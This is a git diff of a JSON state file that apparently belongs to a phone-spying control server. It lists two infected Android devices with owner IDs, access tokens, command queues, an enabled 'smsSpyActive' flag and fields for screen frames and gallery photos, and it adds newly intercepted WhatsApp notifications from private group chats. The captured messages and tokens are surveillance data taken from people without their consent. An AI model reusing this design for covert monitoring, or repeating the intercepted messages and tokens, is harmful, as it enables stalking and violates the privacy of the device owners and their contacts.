@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775043401622,
+    "lastSeen": 1775043404714,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12826 pesan): ~ Bot",
+        "content": "📷 ╭╼─┈───┈──⏣\n┆▣ Channel : Daniel Caesar\n┆▣ Durasi : 2:55\n┆▣ Views : 121900358\n┆▣ Upload : 2 years ago\n╰─╼𔕬─┈───┈──⏣",
+        "time": "01/04 19:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043405891
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15058 pesan dari 9 chat",
+        "time": "01/04 19:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043402228
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12825 pesan): ~ airen anak orang",
@@ -4003,22 +4019,6 @@
         "time": "01/04 19:27",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042838517
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14901 pesan dari 9 chat",
-        "time": "01/04 19:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042835220
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12647 pesan): ~ 𐙚 ˚𝓅𝓊𝓅𝓊𝓉",
-        "content": "💟 Stiker",
-        "time": "01/04 19:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042835114
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775043399773,
+    "lastSeen": 1775043405802,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15058 pesan dari 9 chat",
+        "time": "01/04 19:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043402214
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12825 pesan): ~ airen anak orang",
@@ -8056,14 +8064,6 @@
         "time": "01/04 19:27",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042835207
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12647 pesan): ~ 𐙚 ˚𝓅𝓊𝓅𝓊𝓉",
-        "content": "💟 Stiker",
-        "time": "01/04 19:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042835185
       }
     ],
     "galleryPhotos": [],
